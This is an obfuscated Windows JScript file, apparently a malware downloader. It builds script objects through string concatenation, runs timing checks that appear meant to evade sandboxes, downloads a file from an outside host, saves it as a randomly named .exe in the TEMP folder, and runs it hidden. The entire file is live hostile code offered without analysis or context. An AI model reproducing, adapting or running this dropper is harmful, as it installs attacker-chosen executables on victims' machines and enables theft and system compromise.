var D = false;
var C = "Create"+"Object";
var L2 = function H() {return WScript[C]("WScript"+".Shell");}(), XR = 11;
var Y1 = "MSXML2"+".XMLHTTP";
var Y2 = 2;
var B0 = Y2 - 2;
function GL(Q0){L2["Run"](Q0, B0, B0);};
function L(){return Y1 + "";};
function L0(PN, K0){B0 = B0 * 1; return PN - K0;};
function HH(){return C;};
/*@cc_on
  @if (@_win32 || @_win64)
    D = true;
  @end
@*/
if (D)
{
var F = "";
function B(){return 22;};
var UW = 0; var FD = 0;
function G()
{
var US = new this["Date"]();
var QB = US["getUTCMilliseconds"]();
WScript["Sleep"](B());
var US = new this["Date"]();
var C0 = US["getUTCMilliseconds"]();
WScript["Sleep"](B());
var US = new this["Date"]();
var Y0 = US["getUTCMilliseconds"]();
var UW = "OA";
UW = L0(C0, QB);
var FD = "SQ";
FD = L0(Y0, C0);
F = "open";
return L0(UW, FD);
}
var KU = false;
var L1 = false;
for (var S = B0; S < B() * 1; S++){if (G() != B0){
KU = true; 
FD = "31" + 11 * UW + FD; 
L1 = true; 
break;
}}
function ZW() {return ((KU == true) && (KU == L1)) ? 1 : B0;};
if (KU && ZW() && L1){
function EL() {return L2["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "5vdIG1CkFP9zc.ex" + "e";};
 HO = L();
 KL = WScript[C](HO);
 var Q = 1;
do { 
	for (;Q;){
	try {
		if (Q == 1)
		{
			KL[F]("GET", "http://be-stlines-tore.com/u3rsap", false);
			KL["send"]();
			JZ = "Sleep";
			Q = 2;
		}
		WScript[JZ](B() + 120); 
		if (KL["readystate"] < 2 * 2) continue;
		Q = B0;
		function Y(K) {var LC = (1, 2, 3, 4, 5, K); return LC;};
		WI = WScript[HH()]("ADODB.Stream");
		HO = WI;
		HO[F]();
		HO["type"] = Y(1);
		HO["write"](KL["ResponseBody"]);
		WI["position"] = Y(B0);
		HO["Save" + "ToFile"](EL(), 2);
		WI["cl"+"ose"]();
		OQ = EL();
		GL(OQ);
	} catch(FV){};};
}while (Q);
}
}

